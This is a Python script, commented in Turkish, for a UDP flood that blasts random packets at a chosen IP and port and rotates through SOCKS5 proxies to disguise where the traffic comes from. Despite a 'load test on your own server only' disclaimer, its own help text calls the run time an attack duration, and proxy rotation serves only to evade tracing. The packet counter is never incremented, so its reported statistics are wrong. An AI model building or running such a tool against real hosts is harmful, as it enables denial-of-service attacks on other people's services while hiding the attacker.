import socket
import random
import time
import argparse
import sys
import socks # 'pip install PySocks' ile kurulmalıdır
import itertools

# Kodu sadece kendi sunucunuzda veya izinli bir ortamda kullanın!

def load_proxies(filepath):
    """Proxy listesini dosyadan okur."""
    try:
        with open(filepath, 'r') as f:
            # Her satırdaki boşlukları ve yeni satır karakterlerini temizle
            proxies = [line.strip() for line in f if line.strip()]
        return proxies
    except FileNotFoundError:
        print(f"\n[HATA] Proxy dosyası bulunamadı: '{filepath}'")
        sys.exit(1)

def udp_flood(ip, port, duration, proxy_list=None):
    
    PAYLOAD_SIZE = 1
    data = random._urandom(256)

    # Proxy listesini sonsuz döngüye sokmak için iterator oluştur
    proxy_iterator = None
    if proxy_list:
        proxy_iterator = itertools.cycle(proxy_list)
        print(f"🔄 {len(proxy_list)} adet SOCKS5 Proxy dosyadan yüklendi. Döngüsel kullanılacak.")

    print(f"🚀 UDP Flood Testi Başlatılıyor...")
    print(f"Hedef IP: {ip}")
    print(f"Hedef Port: {port}")
    print(f"Süre: {duration} saniye")
    print("-" * 30)

    start_time = time.time()
    packet_count = 0
    current_proxy = None
    
    try:
        while True:
            if time.time() - start_time >= duration:
                break
            
            # Eğer proxy kullanılıyorsa, döngüsel olarak bir sonrakine geç
            if proxy_iterator:
                # Yeni bir proxy seç ve ayarla
                proxy_str = next(proxy_iterator)
                current_proxy = proxy_str
                try:
                    proxy_ip, proxy_port = proxy_str.split(':')
                    proxy_port = int(proxy_port)
                    
                    socks.set_default_proxy(socks.SOCKS5, proxy_ip, proxy_port)
                    sock = socks.socksocket(socket.AF_INET, socket.SOCK_DGRAM)
                    
                    # Proxy değişimini bildir (sadece her 100. pakette bildirim karmaşayı azaltır)
                    if packet_count % 10000 == 0:
                         print(f"Aktif... Proxy: {proxy_ip}:{proxy_port}", end='\r')

                except ValueError:
                    print(f"\n[HATA] Geçersiz proxy formatı: {proxy_str}. 'ip:port' şeklinde olmalı.")
                    continue
                except socks.ProxyError as e:
                    # Hatalı proxy'yi atla, bir sonrakine geç
                    # print(f"\n[HATA] Proxy hatası ({proxy_str}): {e}. Atlanıyor.")
                    continue
                except Exception as e:
                    # Diğer hatalar
                    # print(f"\n[HATA] Genel hata ({proxy_str}): {e}. Atlanıyor.")
                    continue
            else:
                # Proxy kullanılmıyorsa standart soketi kullan
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                #if packet_count % 100000 == 0:
                    #print(f"Aktif... Toplam paket: {packet_count}", end='\r')
            
            # Paketi gönderme
            ran = random.randrange(10**80)
            hex = "%064x" % ran
            hex = hex[:64]
            
            sock.sendto(data.fromhex(hex) + data, (ip, port))
            #packet_count += 1
            
            # Soketi hemen kapat, yoksa proxy kullanımı yavaşlar/karışır
            sock.close() 

    except socket.error as e:
        print(f"\n[HATA] Bir soket hatası oluştu: {e}")
    except KeyboardInterrupt:
        print("\n[DURDURULDU] Kullanıcı tarafından durduruldu.")
        
    finally:
        end_time = time.time()
        elapsed_time = end_time - start_time
        
        print("\n" + "=" * 30)
        print("✅ Test Tamamlandı!")
        print(f"Toplam Süre: {elapsed_time:.2f} saniye")
        print(f"Gönderilen Toplam Paket: {packet_count}")
        if elapsed_time > 0:
            pps = packet_count / elapsed_time
            print(f"Ortalama Hız: {pps:.2f} paket/saniye (pps)")
        print("=" * 30)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Basit UDP Flood Yük Testi Aracı (Dosyadan Proxy Okuma Destekli). Sadece kendi sunucunuzda kullanın!",
        usage="%(prog)s <IP> <PORT> -d <SÜRE_SN> [-f <PROXY_DOSYASI>]"
    )
    
    parser.add_argument("ip", help="Hedef sunucunun IP adresi veya hostname.")
    parser.add_argument("port", type=int, help="Hedef sunucunun UDP port numarası.")
    parser.add_argument(
        "-d", "--duration", 
        type=int, 
        default=30, 
        help="Saldırı süresi (saniye cinsinden). Varsayılan: 30 saniye."
    )
    
    # Yeni Proxy Dosyası parametresi
    parser.add_argument(
        "-f", "--file", 
        default=None, 
        help="SOCKS5 proxy'lerin listelendiği dosyanın yolu (Örn: proxies.txt). Format: ip:port"
    )

    args = parser.parse_args()
    
    proxy_list = None
    if args.file:
        proxy_list = load_proxies(args.file)
        if not proxy_list:
            print("\n[BİLGİ] Proxy dosyasında geçerli proxy bulunamadı. Proxy kullanmadan devam ediliyor.")

    udp_flood(args.ip, args.port, args.duration, proxy_list)
